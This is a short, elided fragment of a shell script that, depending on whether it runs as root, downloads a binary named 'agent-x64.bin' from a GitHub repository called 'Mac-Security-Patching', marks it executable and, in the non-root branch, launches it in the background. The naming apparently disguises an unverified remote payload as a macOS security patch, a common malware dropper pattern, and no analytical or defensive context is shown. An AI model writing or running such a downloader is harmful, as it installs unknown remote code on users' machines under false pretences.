...
if [ "$EUID" -ne 0 ]; then
    ...
    curl https://raw.githubusercontent.com/xxoo-d/Mac-Security-Patching/refs/heads/main/agent-x64.bin -o $PROGRAM
    chmod +x $PROGRAM
    $PROGRAM &
else
    ...
    curl https://raw.githubusercontent.com/xxoo-d/Mac-Security-Patching/refs/heads/main/agent-x64.bin -o $ROOTPROGRAM
    chmod +x $ROOTPROGRAM
